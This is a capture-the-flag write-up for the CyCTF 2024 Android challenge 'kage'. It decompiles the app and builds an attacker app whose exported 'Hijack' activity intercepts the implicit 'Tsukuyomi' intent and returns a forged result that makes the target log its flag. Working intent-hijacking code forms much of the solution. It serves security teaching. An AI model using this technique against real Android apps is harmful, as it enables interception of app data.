---
title: "Mobile: kage"
date: "2024-11-03"
tags:
    - android
thumbnail: "/assets/img/thumbnail/cyctf2024.png"
---


# solution
---
We are given in this challenge 2 APKs the main challenge is the sealing version of the apk with the real flag and the second one is the fake version with the fake flag used for testing.
The fake version contains a fake flag, but once u get the approach and get the flag you can use the same approach to get the real flag from the sealing app.

I got the source code using `Jadx`.
First thing i do usually is looking in `AndroidMainfest.xml` file.
<img src="/assets/img/cyctf qual 24/capture5.png">
In this challenge the MainActivity is the interesting part and has all what we need to solve the challenge, Let's look at it.
```java
package com.cyctf.kage;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes3.dex */
public class MainActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (getIntent() != null && "Secret_Action".equals(getIntent().getAction())) {
            Intent intent = new Intent("Tsukuyomi");
            try {
                Toast.makeText(this, "Be Careful, Something was sent to you", 1).show();
                startActivityForResult(intent, 1337);
                return;
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "No App Can Handle My Shadow!!", 1).show();
                return;
            }
        }
        Toast.makeText(this, "Invalid action!.", 1).show();
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        ImageView myImageView = (ImageView) findViewById(R.id.imageView);
        if (intent != null && getIntent() != null && getIntent().getBooleanExtra("Unlock", false) && intent.getIntExtra("RegistrationNumber", -1) == 5192) {
            myImageView.setImageResource(R.drawable.image);
            Toast.makeText(this, "Check Logs For Your Reward!!", 1).show();
            Log.d("Jester", new String("Cyctf{Fake_Flag_don't_Submit}"));
        }
    }
}
```
We have `onCreate` function at which
- This activity is started by intent whose action is `Secret_Action`
- Then if the previous condition is true, a new intent is created whose action is `Tsukuyomi` and this new intent is used to send the start activity using `startActivityForResult(intent, 1337)`
- `startActivityForResult()`: can start activity and also expects a response from the activity it started, It receives this response through `onActivityResult()`
> Note: The response sent by us is sent through `setResult(RESULT_OK,intent)`
- We see in the code `onActivityResult(int i, int i2, Intent intent)` which accepts the response as we said and it sends the flag if the condition `(intent != null && getIntent() != null && getIntent().getBooleanExtra("Unlock", false) && intent.getIntExtra("RegistrationNumber", -1) == 5192)` is true
- This condition has
    - `intent` which is the parameter to `onActivityResult()` function and it's sent by us through `setResult()` function
    - `getIntent()` which is first intent we used to start this application whose action is `Secret_Action`

So our approach to solve the challenge will be
<img src="/assets/img/cyctf qual 24/capture6.png">
Creating an application which will do the following
- sending an intent with `action: Secret_Action` (to trigger the condition in onCreate function) and extra bool data `Unlock: true` (to trigger the condition in onActivityResult)

```java
Intent intent = new Intent("Secret_Action");
intent.setClassName("com.cyctf.kage","com.cyctf.kage.MainActivity");
intent.putExtra("Unlock",true);
startActivity(intent);
```
The code above in the MainActivity of the app we created
- The target's MainActivity starts and creates an intent whose `action: Tsukuyomi` and sends it using `startActivityForResult(intent, 1337);`
- We will receive it by having an application with intent filter to accept intent whose `action: Tsukuyomi`

```java
<activity
    android:name=".Hijack"
    android:exported="true">
    <intent-filter>
        <action android:name="Tsukuyomi" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```
Above is the intent filter of the activity we used to receive the intent whose `action: Tsukuyomi`
> Note: hijack activity is another activity other than the MainActivity of our app
- Then after receiving this intent, create an intent with extra Int data `RegistrationNumber: 5192`
- Send this intent using `setResult` function as response to the target
```java
public class Hijack extends AppCompatActivity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_hijack);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

            Intent resultIntent = new Intent();
            resultIntent.putExtra("RegistrationNumber", 5192);
            setResult(RESULT_OK,resultIntent);
            finish();
        }
    }
```

- This intent will be received by the target through `onActivityResult` and will trigger the condition to log the flag 
- Watch the logs after running the app.
<img src="/assets/img/cyctf qual 24/capture7.png">
GG, I wish you enjoyed the write up